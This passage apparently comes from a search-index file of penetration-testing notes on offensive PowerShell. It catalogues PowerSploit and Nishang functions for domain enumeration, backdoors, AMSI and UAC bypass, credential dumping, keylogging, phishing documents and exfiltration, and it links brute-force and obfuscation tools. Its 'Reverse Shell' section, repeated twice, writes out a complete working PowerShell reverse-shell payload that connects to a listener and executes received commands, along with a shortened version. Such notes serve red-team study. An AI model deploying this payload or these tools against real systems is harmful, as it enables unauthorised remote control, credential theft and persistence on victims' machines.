a specified active directory object Get - LastLoggedOn - return the last logged on user for a target host Get - CachedRDPConnection - queries all saved RDP connection entries on a target host Invoke - ACLScanner - enumerate -1000+ modifable ACLs on a specified domain Get - GUIDMap - returns a hash table of current GUIDs - display names Get - DomainSID - return the SID for the specified domain Invoke - ThreadedFunction - helper that wraps threaded invocation for other net * Functions: Get - NetDomain - gets the name of the current user's domain Get - NetForest - gets the forest associated with the current user's domain Get - NetForestDomain - gets all domains for the current forest Get - NetDomainController - gets the domain controllers for the current computer's domain Get - NetUser - returns all user objects, or the user specified (wildcard specifiable) Add - NetUser - adds a local or domain user Get - NetComputer - gets a list of all current servers in the domain Get - NetPrinter - gets an array of all current computers objects in a domain Get - NetOU - gets data for domain organization units Get - NetSite - gets current sites in a domain Get - NetSubnet - gets registered subnets for a domain Get - NetGroup - gets a list of all current groups in a domain Get - NetGroupMember - gets a list of all current users in a specified domain group Get - NetLocalGroup - gets the members of a localgroup on a remote host or hosts Add - NetGroupUser - adds a local or domain user to a local or domain group Get - NetFileServer - get a list of file servers used by current domain users Get - DFSshare - gets a list of all distribute file system shares on a domain Get - NetShare - gets share information for a specified server Get - NetLoggedon - gets users actively logged onto a specified server Get - NetSession - gets active sessions on a specified server Get - NetRDPSession - gets active RDP sessions for a specified server (like qwinsta) Get - NetProcess - gets the remote processes and owners on a remote server Get - UserEvent - returns logon or TGT events from the event log for a specified host Get - ADObject - takes a domain SID and returns the user, group, or computer object associated with it Set - ADObject - takes a SID, name, or SamAccountName to query for a specified domain object, and then sets a specified 'PropertyName' to a specified 'PropertyValue' GPO functions: Get - GptTmpl - parses a GptTmpl.inf to a custom object Get - NetGPO - gets all current GPOs for a given domain Get - NetGPOGroup - gets all GPOs in a domain that set \"Restricted Groups\" on on target machines Find - GPOLocation - takes a user/group and makes machines they have effective rights over through GPO enumeration and correlation Find - GPOComputerAdmin - takes a computer and determines who has admin rights over it through GPO enumeration Get - DomainPolicy - returns the default domain or DC policy User-Hunting Functions: Invoke - UserHunter - finds machines on the local domain where specified users are logged into, and can optionally check if the current user has local admin access to found machines Invoke - StealthUserHunter - finds all file servers utilizes in user HomeDirectories, and checks the sessions one each file server, hunting for particular users Invoke - ProcessHunter - hunts for processes with a specific name or owned by a specific user on domain machines Invoke - UserEventHunter - hunts for user logon events in domain controller event logs Domain Trust Functions: Get - NetDomainTrust - gets all trusts for the current user's domain Get - NetForestTrust - gets all trusts for the forest associated with the current user's domain Find - ForeignUser - enumerates users who are in groups outside of their principal domain Find - ForeignGroup - enumerates all the members of a domain's groups and finds users that are outside of the queried domain Invoke - MapDomainTrust - try to build a relational mapping of all domain trusts MetaFunctions: Invoke - ShareFinder - finds (non-standard) shares on hosts in the local domain Invoke - FileFinder - finds potentially sensitive files on hosts in the local domain Find - LocalAdminAccess - finds machines on the domain that the current user has local admin access to Find - ManagedSecurityGroups - searches for active directory security groups which are managed and identify users who have write access to those groups (i.e. the ability to add or remove members) Find - UserField - searches a user field for a particular term Find - ComputerField - searches a computer field for a particular term Get - ExploitableSystem - finds systems likely vulnerable to common exploits Invoke - EnumerateLocalAdmin - enumerates members of the local Administrators groups across all machines in the domain","title":"PowerSploit"},{"location":"os/windows/powershell/modules/#nishang","text":"https://github.com/samratashok/nishang - framework and collection of scripts and payloads which enables usage of PowerShell for offensive security, penetration testing and red teaming ActiveDirectory Set-DCShadowPermissions Modify AD objects to provide minimal permissions required for DCShadow. Antak - the Webshell Antak Execute PowerShell scripts in memory, run commands, and download and upload files using this webshell. Backdoors HTTP-Backdoor A backdoor which can receive instructions from third party websites and execute PowerShell scripts in memory. DNS_TXT_Pwnage A backdoor which can receive commands and PowerShell scripts from DNS TXT queries, execute them on a target, and be remotely controlled using the queries. Execute-OnTime A backdoor which can execute PowerShell scripts at a given time on a target. Gupt-Backdoor A backdoor which can receive commands and scripts from a WLAN SSID without connecting to it. Add-ScrnSaveBackdoor A backdoor which can use Windows screen saver for remote command and script execution. Invoke-ADSBackdoor A backdoor which can use alternate data streams and Windows Registry to achieve persistence. Add-RegBackdoor A backdoor which uses well known Debugger trick to execute payload with Sticky keys and Utilman (Windows key + U). Set-RemoteWMI Modify permissions of DCOM and WMI namespaces to allow access to a non-admin user. Set-RemotePSRemoting Modify permissions of PowerShell remoting to allow access to a non-admin user. Bypass Invoke-AmsiBypass Implementation of publicly known methods to bypass/avoid AMSI. Client Out-CHM Create infected CHM files which can execute PowerShell commands and scripts. Out-Word Create Word files and infect existing ones to run PowerShell commands and scripts. Out-Excel Create Excel files and infect existing ones to run PowerShell commands and scripts. Out-HTA Create a HTA file which can be deployed on a web server and used in phishing campaigns. Out-Java Create signed JAR files which can be used with applets for script and command execution. Out-Shortcut Create shortcut files capable of executing PowerShell commands and scripts. Out-WebQuery Create IQY files for phishing credentials and SMB hashes. Out-JS Create JS files capable of executing PowerShell commands and scripts. Out-SCT Create SCT files capable of executing PowerShell commands and scripts. Out-SCF Create a SCF file which can be used for capturing NTLM hash challenges. Escalation Enable-DuplicateToken When SYSTEM privileges are required. Remove-Update Introduce vulnerabilities by removing patches. Invoke-PsUACme Bypass UAC. Execution Download-Execute-PS Download and execute a PowerShell script in memory. Download_Execute Download an executable in text format, convert it to an executable, and execute. Execute-Command-MSSQL Run PowerShell commands, native commands, or SQL commands on a MSSQL Server with sufficient privileges. Execute-DNSTXT-Code Execute shellcode in memory using DNS TXT queries. Out-RundllCommand Execute PowerShell commands and scripts or a reverse PowerShell session using rundll32.exe. Gather Check-VM Check for a virtual machine. Copy-VSS Copy the SAM file using Volume Shadow Copy Service. Invoke-CredentialsPhish Trick a user into giving credentials in plain text. FireBuster FireListener A pair of scripts for egress testing Get-Information Get juicy information from a target. Get-LSASecret Get LSA Secret from a target. Get-PassHashes Get password hashes from a target. Get-WLAN-Keys Get WLAN keys in plain text from a target. Keylogger Log keystrokes from a target. Invoke-MimikatzWdigestDowngrade Dump user passwords in plain on Windows 8.1 and Server 2012 Get-PassHints Get password hints of Windows users from a target. Show-TargetScreen Connect back and Stream target screen using MJPEG. Invoke-Mimikatz Load mimikatz in memory. Updated and with some customisation. Invoke-Mimikittenz Extract juicy information from target process (like browsers) memory using regex. Invoke-SSIDExfil Exfiltrate information like user credentials, using WLAN SSID. Invoke-SessionGopher Identify admin jump-boxes and/or computers used to access Unix machines. Extract information from Putty and RDP (ppk, rdp, stdid) Decrypt passwords for WinSCP from registry \"Admin\" required for remote operations \"-ExcludeDc\" to prevent detection MITM Invoke-Interceptor A local HTTPS proxy for MITM attacks. Pivot Create-MultipleSessions Check credentials on multiple computers and create PSSessions. Run-EXEonRemote Copy and execute an executable on multiple machines. Invoke-NetworkRelay Create network relays between computers. Prasadhak Prasadhak Check running hashes of running process against the VirusTotal database. Scan Brute-Force Brute force FTP, Active Directory, MSSQL, and Sharepoint. Port-Scan A handy port scanner. Powerpreter Powerpreter All the functionality of nishang in a single script module. Shells Invoke-PsGcat Send commands and scripts to specifed Gmail account to be executed by Invoke-PsGcatAgent Invoke-PsGcatAgent Execute commands and scripts sent by Invoke-PsGcat. Invoke-PowerShellTcp An interactive PowerShell reverse connect or bind shell Invoke-PowerShellTcpOneLine Stripped down version of Invoke-PowerShellTcp. Also contains, a skeleton version which could fit in two tweets. Invoke-PowerShellTcpOneLineBind Bind version of Invoke-PowerShellTcpOneLine. Invoke-PowerShellUdp An interactive PowerShell reverse connect or bind shell over UDP Invoke-PowerShellUdpOneLine Stripped down version of Invoke-PowerShellUdp. Invoke-PoshRatHttps Reverse interactive PowerShell over HTTPS. Invoke-PoshRatHttp Reverse interactive PowerShell over HTTP. Remove-PoshRat Clean the system after using Invoke-PoshRatHttps Invoke-PowerShellWmi Interactive PowerShell using WMI. Invoke-PowerShellIcmp An interactive PowerShell reverse shell over ICMP. Invoke-JSRatRundll An interactive PowerShell reverse shell over HTTP using rundll32.exe. Invoke-JSRatRegsvr An interactive PowerShell reverse shell over HTTP using regsvr32.exe. Utility Add-Exfiltration Add data exfiltration capability to Gmail, Pastebin, a web server, and DNS to any script. Add-Persistence Add reboot persistence capability to a script. Remove-Persistence Remote persistence added by the Add-Persistence script. Do-Exfiltration Pipe (|) this to any script to exfiltrate the output. Download Transfer a file to the target. Parse_Keys Parse keys logged by the keylogger. Invoke-Encode Encode and compress a script or string. Invoke-Decode Decode and decompress a script or string from Invoke-Encode. Start-CaptureServer Run a web server which logs Basic authentication and SMB hashes. ConvertTo-ROT13 Encode a string to ROT13 or decode a ROT13 string. Out-DnsTxt Generate DNS TXT records which could be used with other scripts.","title":"Nishang"},{"location":"os/windows/powershell/modules/#external-services","text":"https://github.com/darkoperator/Posh-Shodan](https://github.com/darkoperator/Posh-Shodan ) - PowerShell Module to interact with the Shodan service","title":"External Services"},{"location":"os/windows/powershell/modules/#scaning","text":"https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/Invoke-Portscan.ps1 https://github.com/samratashok/nishang/blob/master/Scan/Invoke-PortScan.ps1 Parse Nmap Reports: https://github.com/SamuelArnold/StarKill3r/blob/master/Star%20Killer/Star%20Killer/bin/Debug/Scripts/SANS-SEC505-master/scripts/Day1-PowerShell/Parse-Nmap.ps1 Paser Nessus Reports: https://github.com/darkoperator/Posh-NVS https://github.com/hardwaterhacker/scandiff - Scandiff is a PowerShell script to automate host discovery and scanning with nmap. After discovering and scanning hosts, scandiff performs an nmap ndiff on the output against previous results, 7zips all generated output, and optionally emails all output to a specified email address.","title":"Scaning"},{"location":"os/windows/powershell/modules/#brute-forcing","text":"Active DIrectory brute forcing: https://github.com/samratashok/nishang/blob/master/Scan/Invoke-BruteForce.ps1 https://github.com/NetSPI/PowerShell/blob/master/Invoke-ExternalDomainBruteforce.ps1 Get-WinRMPassword - https://poshsecurity.com/blog/2014/3/20/powershell-winrm-get-winrmpassword.html Get-WimPassword","title":"Brute Forcing"},{"location":"os/windows/powershell/modules/#database-attacks","text":"PowerUpSQL - Toolkit for Attacking SQL Server: https://github.com/NetSPI/PowerUpSQL Execute command over MSSQL: Nishang/Execute-Command-MSSQL.ps1","title":"Database Attacks"},{"location":"os/windows/powershell/modules/#encoding-payloads","text":"https://github.com/samratashok/nishang/blob/master/Utility/Invoke-Encode.ps1","title":"Encoding Payloads"},{"location":"os/windows/powershell/modules/#capture-ntlm","text":"https://github.com/Kevin-Robertson/Inveigh","title":"Capture NTLM"},{"location":"os/windows/powershell/modules/#obfuscation","text":"https://github.com/danielbohannon/Invoke-Obfuscation https://github.com/danielbohannon/Invoke-DOSfuscation","title":"Obfuscation"},{"location":"os/windows/powershell/modules/#fileless-malware","text":"Invoke-NoShell outputs a Microsoft Office Word .doc file with an embedded macro: https://github.com/G4lB1t/Invoke-NoShell","title":"Fileless Malware"},{"location":"os/windows/powershell/powershell/","text":"Reverse Shell powercat - l - v - p 4444 - t 1000 powershell - e encoded-payload Payload: $c lient = New - Object System . Net . Sockets . TCPClient ( 10.10.10.10 , 80 ) ;$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2 1 | Out-String );$sendback2 = $sendback + PS + (pwd).Path + ;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close() Shortened Payload: #$ sm = ( New - Object Net . Sockets . TCPClient ( 192.168.254.1 , 55555 )) . GetStream () ;[byte[]]$bt=0..255|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2 1));$sm.Write($st,0,$st.Length)} http://www.labofapenetrationtester.com/2015/05/week-of-powershell-shells-day-1.html TCP / UDP / WMI Shells: https://github.com/samratashok/nishang/tree/master/Shells","title":"Reverse Shell"},{"location":"os/windows/powershell/powershell/#reverse-shell","text":"powercat - l - v - p 4444 - t 1000 powershell - e encoded-payload Payload: $c lient = New - Object System . Net . Sockets . TCPClient ( 10.10.10.10 , 80 ) ;$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2 1 | Out-String );$sendback2 = $sendback + PS + (pwd).Path + ;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close() Shortened Payload: #$ sm = ( New - Object Net . Sockets . TCPClient ( 192.168.254.1 , 55555 )) . GetStream () ;[byte[]]$bt=0..255|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2 1));$sm.Write($st,0,$st.Length)} http://www.labofapenetrationtester.com/2015/05/week-of-powershell-shells-day-1.html","title":"Reverse Shell"},{"location":"os/windows/powershell/powershell/#tcp-udp-wmi-shells","text":"https://github.com/samratashok/nishang/tree/master/Shells","title":"TCP / UDP / WMI Shells:"},{"location":"os/windows/powershell/z-Resources/","text":"Resources New References PowerShell Basics for Security Professionals Part 1: https://www.youtube.com/watch?v=B0EsL1j_-qw Constrained Mode: https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/ Development Environment How To Make Visual Studio Code Look And Behave Like The PowerShell ISE: https://blog.techsnips.io/how-to-make-visual-studio-code-look-and-behave-like-the-powershell-ise/","title":"Resources"},{"location":"os/windows/powershell/z-Resources/#resources","text":"","title":"Resources"},{"location":"os/windows/powershell/z-Resources/#new-references","text":"PowerShell Basics for Security Professionals Part 1: https://www.youtube.com/watch?v=B0EsL1j_-qw Constrained Mode: https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/","title":"New References"},{"location":"os/windows/powershell/z-Resources/#development-environment","text":"How To Make Visual Studio Code Look And Behave Like The PowerShell ISE: https://blog.techsnips.io/how-to-make-visual-studio-code-look-and-behave-like-the-powershell-ise/","title":"Development Environment"}]}